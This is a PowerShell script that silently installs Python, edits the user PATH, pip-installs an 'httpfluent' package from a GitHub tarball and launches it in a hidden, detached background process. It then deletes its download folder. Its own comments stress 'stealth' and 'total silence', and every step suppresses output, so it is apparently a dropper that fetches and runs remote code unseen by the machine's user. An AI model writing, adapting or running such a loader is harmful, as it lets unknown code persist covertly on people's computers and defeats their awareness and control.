# ===================================================
# Python 3.12.6 + httpfluent (Final Stealth Smooth)
# TOTAL SILENCE - BACKGROUND EXECUTION
# ===================================================

$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"
$InstallRequired = $true

# --- Step 0: Pre-Check (Silent) ---
if (Get-Command python -ErrorAction SilentlyContinue) {
    $CheckPath = "python"
} elseif (Test-Path $PythonExe) {
    $CheckPath = $PythonExe
}

if ($CheckPath) {
    $VersionString = & $CheckPath --version 2>&1
    if ($VersionString -match "Python (\d+\.\d+\.\d+)") {
        if ([version]$Matches[1] -ge [version]"3.9") { 
            $InstallRequired = $false 
            $ExecutableToUse = $CheckPath
        }
    }
}

# --- YOUR ALGORITHM (Steps 1-5) ---
if ($InstallRequired) {
    $PythonVersion = "3.12.6"
    $PythonInstaller = "python-$PythonVersion-amd64.exe"
    $DownloadUrl = "https://www.python.org/ftp/python/$PythonVersion/$PythonInstaller"
    $DownloadDir = "$env:TEMP\Python"

    if (-not (Test-Path $DownloadDir)) { New-Item -ItemType Directory -Path $DownloadDir > $null 2>&1 }
    $InstallerPath = Join-Path $DownloadDir $PythonInstaller
    
    try {
        (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $InstallerPath)
    } catch { exit 1 }

    # Step 4: Install Python (Hidden)
    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait -WindowStyle Hidden > $null 2>&1

    # Step 5: Fix USER PATH
    $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
    $CleanPath = $OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),""
    $NewPath = "$InstallDir;$InstallDir\Scripts;$CleanPath"
    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User") > $null 2>&1
    
    $env:Path = $NewPath
    $ExecutableToUse = $PythonExe
}

# --- Step 7: Package Installation (Silent) ---
& $ExecutableToUse -m pip install --upgrade pip --quiet > $null 2>&1
& $ExecutableToUse -m pip install requests --quiet > $null 2>&1
& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet > $null 2>&1

# --- THE EXECUTION (Background Fix) ---
# We use Start-Process with Hidden style to run the command that worked.
# This detaches it from the script session so it stays alive.
Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command httpfluent" -WindowStyle Hidden -CreateNoWindow > $null 2>&1

# --- Step 8: Cleanup ---
if (Test-Path "$env:TEMP\Python") {
    Remove-Item "$env:TEMP\Python" -Recurse -Force -ErrorAction SilentlyContinue > $null 2>&1
}
